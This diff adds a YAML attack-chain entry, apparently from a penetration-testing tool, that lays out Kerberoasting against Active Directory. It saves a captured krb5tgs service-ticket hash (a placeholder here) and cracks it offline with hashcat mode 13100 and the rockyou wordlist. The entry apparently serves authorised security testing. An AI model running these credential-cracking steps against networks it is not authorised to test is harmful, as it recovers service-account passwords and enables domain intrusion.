@@ -1,0 +1,29 @@
+chain_id: kerberos_kerberoast
+title: "Kerberoasting — crack krb5tgs$23 hashes (hashcat -m 13100)"
+severity: CRITICAL
+tags: [crypto, kerberos, ad, kerberoasting, hashcat]
+
+trigger:
+  any_of:
+    - { kind: kerberos-tgs }
+
+description: |
+  Kerberoastable service ticket captured ($krb5tgs$23$*svc*$...). Any
+  authenticated AD user can request a TGS for an SPN-bound account and
+  crack it offline. svc_ accounts often have weak human-set passwords.
+
+steps:
+  - id: 1
+    title: "Save the hash"
+    command: echo '$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$cifs/...*$abcdef...$0123...' > tgs.hash
+
+  - id: 2
+    title: "Crack with hashcat"
+    command: hashcat -m 13100 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt
+
+  - id: 3
+    title: "Show the result"
+    command: hashcat -m 13100 tgs.hash --show
+
+references:
+  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
